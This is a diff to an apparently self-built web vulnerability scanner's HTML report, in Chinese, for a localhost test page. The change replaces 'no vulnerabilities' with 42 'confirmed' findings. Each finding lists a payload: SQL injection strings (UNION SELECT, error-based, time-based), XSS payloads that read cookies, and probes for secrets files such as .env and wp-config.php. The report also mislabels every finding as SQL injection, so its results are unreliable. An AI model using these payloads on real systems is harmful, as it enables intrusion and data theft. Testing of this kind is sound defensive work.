@@ -17,9 +17,9 @@
     <body>
         <h1>🔍 Web漏洞自动化扫描报告</h1>
         <div class="meta">
-            <p><b>扫描时间：</b> 2026-08-11 20:37:41</p>
+            <p><b>扫描时间：</b> 2026-08-11 22:04:38</p>
             <p><b>扫描目标：</b> http://localhost/test.php</p>
-            <p><b>任务总数：</b> 0 个已确认漏洞</p>
+            <p><b>任务总数：</b> 42 个已确认漏洞</p>
         </div>
         
         <h2>📋 漏洞详情列表</h2>
@@ -32,7 +32,259 @@
                 </tr>
             </thead>
             <tbody>
-                <tr><td colspan='3' style='text-align:center;'>🛡️ 未发现任何漏洞，目标较为安全。</td></tr>
+                
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+%271%27%3D%271</td>
+                <td><code>{'id': "1' OR '1'='1"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+%271%27%3D%271%27+--</td>
+                <td><code>{'id': "1' OR '1'='1' --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+%271%27%3D%271%27+%23</td>
+                <td><code>{'id': "1' OR '1'='1' #"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+%271%27%3D%271%27+%2F%2A</td>
+                <td><code>{'id': "1' OR '1'='1' /*"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+%271%27%3D%272</td>
+                <td><code>{'id': "1' AND '1'='2"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cdatabase%28%29%29%29+--</td>
+                <td><code>{'id': "1' AND extractvalue(1,concat(0x7e,database())) --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+ORDER+BY+1+--</td>
+                <td><code>{'id': "1' ORDER BY 1 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+ORDER+BY+10+--</td>
+                <td><code>{'id': "1' ORDER BY 10 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+ORDER+BY+100+--</td>
+                <td><code>{'id': "1' ORDER BY 100 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=-1%27+UNION+SELECT+1%2C2%2C3+--</td>
+                <td><code>{'id': "-1' UNION SELECT 1,2,3 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=-1%27+UNION+SELECT+1%2C2%2C3%2C4+--</td>
+                <td><code>{'id': "-1' UNION SELECT 1,2,3,4 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=-1%27+UNION+SELECT+1%2C2%2C3%2C4%2C5+--</td>
+                <td><code>{'id': "-1' UNION SELECT 1,2,3,4,5 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=-1%27+UNION+SELECT+1%2Cdatabase%28%29%2Cuser%28%29%2C4%2C5+--</td>
+                <td><code>{'id': "-1' UNION SELECT 1,database(),user(),4,5 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+%271%27%3D%271</td>
+                <td><code>{'id': "1' AND '1'='1"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+%271%27%3D%272</td>
+                <td><code>{'id': "1' AND '1'='2"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+SLEEP%285%29+--</td>
+                <td><code>{'id': "1' AND SLEEP(5) --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+BENCHMARK%2810000000%2CMD5%281%29%29+--</td>
+                <td><code>{'id': "1' AND BENCHMARK(10000000,MD5(1)) --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+1%3D1+--</td>
+                <td><code>{'id': "1' AND 1=1 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+1%3D2+--</td>
+                <td><code>{'id': "1' AND 1=2 --"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+1%3D1+AND+%271%27%3D%271</td>
+                <td><code>{'id': "1' AND 1=1 AND '1'='1"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+1%3D2+AND+%271%27%3D%271</td>
+                <td><code>{'id': "1' AND 1=2 AND '1'='1"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27%2F%2A%2130000OR%2A%2F%271%27%3D%271</td>
+                <td><code>{'id': "1'/*!30000OR*/'1'='1"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271</td>
+                <td><code>{'id': "1'/**/OR/**/'1'='1"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+1%3D1%23</td>
+                <td><code>{'id': "1' OR 1=1#"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+1%3D1%23</td>
+                <td><code>{'id': "1' AND 1=1#"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+%271%27%3D%271%27--+-</td>
+                <td><code>{'id': "1' OR '1'='1'-- -"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+OR+1%3D1--+-</td>
+                <td><code>{'id': "1' OR 1=1-- -"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=1%27+AND+1%3D1--+-</td>
+                <td><code>{'id': "1' AND 1=1-- -"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E</td>
+                <td><code>{'id': "<script>alert('XSS')</script>"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</td>
+                <td><code>{'id': '<img src=x onerror=alert(1)>'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E</td>
+                <td><code>{'id': '"><svg/onload=alert(1)>'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</td>
+                <td><code>{'id': "'><img src=x onerror=alert(1)>"}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?id=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E</td>
+                <td><code>{'id': '<script>alert(document.cookie)</script>'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=.git%2Fconfig</td>
+                <td><code>{'path': '.git/config'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=.env</td>
+                <td><code>{'path': '.env'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=backup.zip</td>
+                <td><code>{'path': 'backup.zip'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=config.php.bak</td>
+                <td><code>{'path': 'config.php.bak'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=db_backup.sql</td>
+                <td><code>{'path': 'db_backup.sql'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=web.config</td>
+                <td><code>{'path': 'web.config'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=robots.txt</td>
+                <td><code>{'path': 'robots.txt'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=.htaccess</td>
+                <td><code>{'path': '.htaccess'}</code></td>
+            </tr>
+            
+            <tr style="background-color: #ffcccc;">
+                <td>SQL注入漏洞</td>
+                <td style="word-break: break-all;">http://localhost:8000/test.php?path=wp-config.php</td>
+                <td><code>{'path': 'wp-config.php'}</code></td>
+            </tr>
+            
             </tbody>
         </table>
         <hr>
